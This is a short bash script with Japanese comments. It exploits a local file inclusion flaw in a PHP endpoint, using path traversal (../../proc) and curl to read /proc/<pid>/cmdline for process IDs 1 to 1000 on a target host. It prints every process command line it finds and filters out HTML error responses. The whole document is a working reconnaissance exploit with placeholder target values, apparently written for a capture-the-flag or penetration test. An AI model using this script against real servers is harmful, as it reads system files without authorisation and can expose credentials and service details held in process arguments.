#!/bin/bash

# LFIが存在する正しいエンドポイントを指定
BASE_URL="http://[IP]/test.php?[param]=../../../../../../../proc"

for pid in $(seq 1 1000); do
  # LFIでcmdlineを取得
  res=$(curl -s "${BASE_URL}/${pid}/cmdline" | tr '\0' ' ')

  # レスポンスが存在し、かつ404エラーやHTMLタグが含まれていない場合のみ表示
  if [ -n "$res" ] && ! echo "$res" | grep -q "DOCTYPE HTML"; then
    echo "PID ${pid}: ${res}"
  fi
done

